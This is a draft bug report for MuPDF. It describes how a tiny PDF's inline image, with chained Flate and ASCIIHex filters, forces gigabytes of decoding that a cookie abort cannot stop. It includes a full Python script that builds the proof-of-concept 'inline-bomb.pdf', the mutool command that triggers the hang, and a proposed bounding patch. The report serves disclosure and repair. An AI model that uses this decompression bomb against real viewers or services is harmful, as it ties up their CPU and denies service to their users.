# Upstream report: an inline image's filters run unbounded (for the owner to file)

For MuPDF's bug tracker (https://bugs.ghostscript.com, product MuPDF). Not filed yet. The patch is
`patches/inline-image-filter-budget.patch` (build.sh applies it); before filing, check that MuPDF's current master still
builds inline images' filter chains as 1.25.2 does (`pdf_open_inline_stream` in `source/pdf/pdf-stream.c`).

---

**Title:** Inline image with [/Fl /Fl /Fl /AHx] decodes gigabytes for a 1x1 image; cookie abort can't stop it

**Version:** 1.25.2 (macOS arm64; the code involved is platform-independent)

**What happens.** An inline image's filters run inside `parse_inline_image`, while the content stream is parsed
(`pdf_load_inline_image` → `pdf_load_compressed_inline_image` → `fz_decomp_image_from_stream`). Nothing in that path
looks at the cookie, and once the content stream's bytes are in the filters' buffers no further file read happens, so
neither `cookie->abort` nor a progressive/`FZ_ERROR_TRYLATER` source can interrupt it.

Some filters consume input without producing output: `ASCIIHexDecode` and `ASCII85Decode` skip white space (NUL is white
space in `iswhite`), and `FlateDecode` skips empty blocks. Chained after decompressing filters, they make the work
unrelated to the image's size: a 1x1 inline image whose data is 4 GB of zeros Flated three times (a few dozen bytes)
with `/F [/Fl /Fl /Fl /AHx]` makes MuPDF inflate the 4 GB, which ASCIIHexDecode then skips, before the one sample is
found missing and padded. The whole PDF is under 1 KB.

Measured in an application calling MuPDF 1.25.2 in-process (release build, Apple M5): about 9 seconds to load the page's
display list or text; the time grows linearly with the size of the zeros (64 GB would take minutes; the file stays under 1 KB).
A stream object with the same filters is less of a problem for us because its filter count is visible before loading;
an inline image's filters aren't visible to the caller without parsing the content stream.

**To reproduce.** This Python 3 script writes `inline-bomb.pdf` (980 bytes; building it takes a minute or two, zlib
compressing 4 GB of zeros):

```python
import sys, zlib

# 4 GB of zeros, Flated three times, as a 1x1 inline image decoded by [/Fl /Fl /Fl /AHx].
zeros = 4 << 30
c = zlib.compressobj(9)
block = bytes(1 << 24)
layer = bytearray()
for _ in range(zeros // len(block)):
    layer += c.compress(block)
layer += c.flush()
data = zlib.compress(zlib.compress(bytes(layer), 9), 9)

content = (b"BT /F1 12 Tf 72 700 Td (Before the image) Tj ET q 100 0 0 100 100 300 cm "
           b"BI /W 1 /H 1 /BPC 8 /CS /G /F [/Fl /Fl /Fl /AHx] ID " + data +
           b" EI Q BT /F1 12 Tf 72 100 Td (After the image) Tj ET")
objs = [
    b"<< /Type /Catalog /Pages 2 0 R >>",
    b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
    b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
    b"<< /Length %d >>\nstream\n" % len(content) + content + b"\nendstream",
    b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
]
out = bytearray(b"%PDF-1.7\n")
offsets = []
for i, o in enumerate(objs):
    offsets.append(len(out))
    out += b"%d 0 obj\n" % (i + 1) + o + b"\nendobj\n"
xref = len(out)
out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1)
for off in offsets:
    out += b"%010d 00000 n \n" % off
out += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objs) + 1, xref)
open(sys.argv[1] if len(sys.argv) > 1 else "inline-bomb.pdf", "wb").write(out)
print(len(out), "bytes")
```

Then `mutool draw -o out.png inline-bomb.pdf` (or `mutool draw -F txt`): seconds of CPU for one tiny image, with the
time set by the zeros' size, not the image's; a viewer's cookie abort during that time has no effect.

**Expected.** The work an inline image's filters do is bounded by something proportional to the image (or the data in
the content stream), and an over-expanding image is treated like any other damaged image data.

**Proposed patch** (against 1.25.2, `source/pdf/pdf-stream.c` only; attached as `inline-image-filter-budget.patch`):
`pdf_open_inline_stream` builds the chain itself (as `build_filter_chain` does) and puts a small pass-through filter
after each filter it opens. The pass-through filters share one budget: all the filters of one inline image together may
produce at most 8 times the image's decoded size (`length`, `stride * h`) plus 1 MB of slack (small images, codecs'
headers). Past it the filters see end of data, with one warning ("inline image data expands too much; truncating"), so
the image is padded as truncated data already is, `parse_inline_image` goes on to find `EI`, and the rest of the page is
drawn. Filters that are left to the image decoder (the last one, when it is an image codec) aren't wrapped; their input,
when another filter produced it, is counted, and `fz_decomp_image_from_stream` reads only `stride * h` bytes of their output. The pass-through copies at
most 4 KB at a time, as the null and range filters do.

With the patch the file above loads in about 10 ms and both strings of text are found. Real inline images stay far
under the budget (ASCIIHex or ASCII85 over Flate is about 2 to 3 times the decoded size in all; a JPEG or CCITT image
is usually smaller than its pixels).

Other options we considered: checking the cookie inside the filters (fz_stream has no cookie, so every filter would
need one), or counting decompressing filters (an application can do that for stream objects; for inline images it can't
without parsing the content stream, and a content stream's own Flate multiplies with the image's).
